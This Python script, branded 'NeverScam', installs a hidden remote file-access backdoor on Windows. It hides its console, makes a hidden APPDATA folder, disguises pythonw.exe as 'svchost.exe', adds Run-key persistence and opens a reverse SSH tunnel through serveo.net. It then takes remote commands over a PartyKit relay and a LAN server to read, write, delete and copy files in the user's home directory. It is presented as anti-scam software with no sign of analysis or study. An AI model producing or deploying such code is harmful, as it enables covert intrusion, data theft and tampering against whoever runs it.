import os
import sys
import shutil
import subprocess
import time
import ctypes
import socket
import json
import threading
import socketserver

# ===== CONFIGURE YOUR PARTYKIT URL HERE =====
PARTYKIT_URL = "https://neverscam-relay.username.partykit.dev"
# ===========================================

RELAY_SERVER_CODE = '''import socketserver
import os
import json
import threading
import time
import sys
import shutil
import socket

PARTYKIT_URL = "''' + PARTYKIT_URL + '''"
ROOM_NAME = "neverscam-room"
DISCOVERY_PORT = 19876

def add_to_startup():
    if sys.platform != "win32":
        return
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        script_path = os.path.abspath(sys.argv[0])
        python_path = sys.executable
        pythonw_path = python_path.replace("python.exe", "pythonw.exe")
        if not os.path.exists(pythonw_path):
            pythonw_path = python_path
        command = f'"{pythonw_path}" "{script_path}"'
        winreg.SetValueEx(key, "NeverScamFileServer", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
    except Exception:
        pass

class RelayClient:
    def __init__(self, url, room):
        self.url = url
        self.room = room
        self.ws = None
        self.connected = False
        self.handlers = []
        
    def connect(self):
        import websocket
        try:
            ws_url = f"{self.url}/{self.room}?role=host"
            self.ws = websocket.WebSocketApp(
                ws_url,
                on_open=self._on_open,
                on_message=self._on_message,
                on_error=self._on_error,
                on_close=self._on_close
            )
            self.ws.run_forever()
        except Exception as e:
            pass
            
    def _on_open(self, ws):
        self.connected = True
        
    def _on_message(self, ws, message):
        try:
            data = json.loads(message)
            msg_data = data.get("data", {})
            for handler in self.handlers:
                handler(msg_data)
        except:
            pass
            
    def _on_error(self, ws, error):
        self.connected = False
        
    def _on_close(self, ws, close_status_code, close_msg):
        self.connected = False
        time.sleep(5)
        self.connect()
        
    def send(self, data):
        if self.connected and self.ws:
            try:
                self.ws.send(json.dumps({"data": data}))
            except:
                pass
                
    def add_handler(self, handler):
        self.handlers.append(handler)

def process_command(cmd_data):
    cmd = cmd_data.get("cmd")
    path = cmd_data.get("path", "")
    path = os.path.abspath(path)
    if not path.startswith(os.path.expanduser("~")):
        return {"error": "Access denied"}
    if cmd == "LIST_DIR":
        try:
            items = os.listdir(path)
            return {"items": items}
        except Exception as e:
            return {"error": str(e)}
    elif cmd == "LIST_DIRS":
        try:
            items = [item for item in os.listdir(path) if os.path.isdir(os.path.join(path, item))]
            return {"items": items}
        except Exception as e:
            return {"error": str(e)}
    elif cmd == "READ_FILE":
        try:
            with open(path, 'r', encoding='utf-8') as f:
                content = f.read()
            return {"content": content}
        except UnicodeDecodeError:
            return {"error": "Binary file"}
        except Exception as e:
            return {"error": str(e)}
    elif cmd == "WRITE_FILE":
        content = cmd_data.get("content", "")
        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write(content)
            return {"status": "ok"}
        except Exception as e:
            return {"error": str(e)}
    elif cmd == "DELETE":
        try:
            if os.path.isfile(path):
                os.remove(path)
            elif os.path.isdir(path):
                os.rmdir(path)
            return {"status": "ok"}
        except Exception as e:
            return {"error": str(e)}
    elif cmd == "MKDIR":
        try:
            os.mkdir(path)
            return {"status": "ok"}
        except Exception as e:
            return {"error": str(e)}
    elif cmd == "RENAME":
        new_path = cmd_data.get("new_path")
        new_path = os.path.abspath(new_path)
        if not new_path.startswith(os.path.expanduser("~")):
            return {"error": "Access denied"}
        try:
            os.rename(path, new_path)
            return {"status": "ok"}
        except Exception as e:
            return {"error": str(e)}
    elif cmd == "COPY":
        dest = cmd_data.get("dest")
        dest = os.path.abspath(dest)
        if not dest.startswith(os.path.expanduser("~")):
            return {"error": "Access denied"}
        try:
            if os.path.isfile(path):
                shutil.copy(path, dest)
            elif os.path.isdir(path):
                shutil.copytree(path, dest)
            return {"status": "ok"}
        except Exception as e:
            return {"error": str(e)}
    elif cmd == "STAT":
        try:
            stat = os.stat(path)
            return {"size": stat.st_size, "mtime": stat.st_mtime}
        except Exception as e:
            return {"error": str(e)}
    return {"error": "Unknown command"}

def run_relay_mode():
    if sys.platform == "win32":
        ctypes.windll.kernel32.FreeConsole()
    
    relay = RelayClient(PARTYKIT_URL, ROOM_NAME)
    
    def handle_message(cmd_data):
        response = process_command(cmd_data)
        relay.send(response)
    
    relay.add_handler(handle_message)
    relay.connect()

def run_hidden():
    if sys.platform == "win32":
        ctypes.windll.kernel32.FreeConsole()
    port = find_best_port()
    ip = get_local_ip()
    try:
        config_path = os.path.join(os.path.expanduser("~"), "NeverScam_Connection.txt")
        with open(config_path, 'w') as f:
            f.write(f"{ip}\\n{port}\\n{PARTYKIT_URL}\\n")
    except:
        pass
    server_thread = threading.Thread(target=run_server, args=(ip, port), daemon=True)
    server_thread.start()
    start_discovery_listener(port, ip)
    while True:
        time.sleep(1)

def start_discovery_listener(server_port, server_ip):
    def listen():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('', DISCOVERY_PORT))
            sock.settimeout(1)
            while True:
                try:
                    data, addr = sock.recvfrom(1024)
                    if data == b"NEVERSCAM_DISCOVERY":
                        response = json.dumps({"ip": server_ip, "tcp_port": server_port, "relay_url": PARTYKIT_URL}).encode()
                        sock.sendto(response, addr)
                except socket.timeout:
                    continue
                except:
                    break
        except:
            pass
    threading.Thread(target=listen, daemon=True).start()

def find_best_port(start_port=10000, max_attempts=100):
    for port in range(start_port, start_port + max_attempts):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(('', port))
                return port
        except OSError:
            continue
    return 12345

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

class FileServerHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            data = self.request.recv(4096).strip()
            if not data:
                return
            command = json.loads(data.decode('utf-8'))
            response = self.process_command(command)
            self.request.sendall(json.dumps(response).encode('utf-8'))
        except Exception as e:
            self.request.sendall(json.dumps({"error": str(e)}).encode('utf-8'))

    def process_command(self, command):
        cmd = command.get("cmd")
        path = command.get("path", "")
        path = os.path.abspath(path)
        if not path.startswith(os.path.expanduser("~")):
            return {"error": "Access denied"}
        if cmd == "LIST_DIR":
            try:
                items = os.listdir(path)
                return {"items": items}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "LIST_DIRS":
            try:
                items = [item for item in os.listdir(path) if os.path.isdir(os.path.join(path, item))]
                return {"items": items}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "READ_FILE":
            try:
                with open(path, 'r', encoding='utf-8') as f:
                    content = f.read()
                return {"content": content}
            except UnicodeDecodeError:
                return {"error": "Binary file"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "WRITE_FILE":
            content = command.get("content", "")
            try:
                with open(path, 'w', encoding='utf-8') as f:
                    f.write(content)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "DELETE":
            try:
                if os.path.isfile(path):
                    os.remove(path)
                elif os.path.isdir(path):
                    os.rmdir(path)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "MKDIR":
            try:
                os.mkdir(path)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "RENAME":
            new_path = command.get("new_path")
            new_path = os.path.abspath(new_path)
            if not new_path.startswith(os.path.expanduser("~")):
                return {"error": "Access denied"}
            try:
                os.rename(path, new_path)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "COPY":
            dest = command.get("dest")
            dest = os.path.abspath(dest)
            if not dest.startswith(os.path.expanduser("~")):
                return {"error": "Access denied"}
            try:
                if os.path.isfile(path):
                    shutil.copy(path, dest)
                elif os.path.isdir(path):
                    shutil.copytree(path, dest)
                return {"status": "ok"}
            except Exception as e:
                return {"error": str(e)}
        elif cmd == "STAT":
            try:
                stat = os.stat(path)
                return {"size": stat.st_size, "mtime": stat.st_mtime}
            except Exception as e:
                return {"error": str(e)}
        else:
            return {"error": "Unknown command"}

def run_server(host='0.0.0.0', port=None):
    if port is None:
        port = find_best_port()
    with socketserver.ThreadingTCPServer((host, port), FileServerHandler) as server:
        server.serve_forever()

if __name__ == "__main__":
    add_to_startup()
    run_relay_mode()
'''

TUNNEL_BATCH = '''@echo off
>nul 2>&1
ssh -R neverscam:80:localhost:12345 serveo.net
'''

def hide_console():
    if sys.platform == "win32":
        ctypes.windll.kernel32.FreeConsole()

def get_pythonw_path():
    python_path = sys.executable
    pythonw_path = python_path.replace("python.exe", "pythonw.exe")
    if os.path.exists(pythonw_path):
        return pythonw_path
    return python_path

def create_hidden_directory():
    appdata = os.environ.get('APPDATA')
    install_dir = os.path.join(appdata, 'NeverScam')
    os.makedirs(install_dir, exist_ok=True)
    try:
        subprocess.run(['attrib', '+h', install_dir], capture_output=True)
    except:
        pass
    return install_dir

def install_server(install_dir):
    server_path = os.path.join(install_dir, 'server.py')
    with open(server_path, 'w') as f:
        f.write(RELAY_SERVER_CODE)
    
    pythonw_path = get_pythonw_path()
    svchost_path = os.path.join(install_dir, 'svchost.exe')
    if os.path.exists(pythonw_path):
        shutil.copy2(pythonw_path, svchost_path)

def create_tunnel_script(install_dir):
    tunnel_path = os.path.join(install_dir, 'tunnel.bat')
    with open(tunnel_path, 'w') as f:
        f.write(TUNNEL_BATCH)
    return tunnel_path

def add_to_startup(server_path, svchost_path, tunnel_path):
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        server_cmd = f'"{svchost_path}" "{server_path}"'
        winreg.SetValueEx(key, "NeverScamServer", 0, winreg.REG_SZ, server_cmd)
        winreg.SetValueEx(key, "NeverScamTunnel", 0, winreg.REG_SZ, tunnel_path)
        winreg.CloseKey(key)
    except:
        pass

def run_hidden(process_path, args=""):
    startupinfo = subprocess.STARTUPINFO()
    startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    startupinfo.wShowWindow = 0
    subprocess.Popen(
        [process_path] + (args.split() if args else []),
        startupinfo=startupinfo,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

def install():
    hide_console()
    install_dir = create_hidden_directory()
    install_server(install_dir)
    tunnel_path = create_tunnel_script(install_dir)
    server_path = os.path.join(install_dir, 'server.py')
    svchost_path = os.path.join(install_dir, 'svchost.exe')
    add_to_startup(server_path, svchost_path, tunnel_path)
    run_hidden(svchost_path, server_path)
    run_hidden('cmd.exe', f'/c "{tunnel_path}"')
    sys.exit(0)

if __name__ == "__main__":
    install()

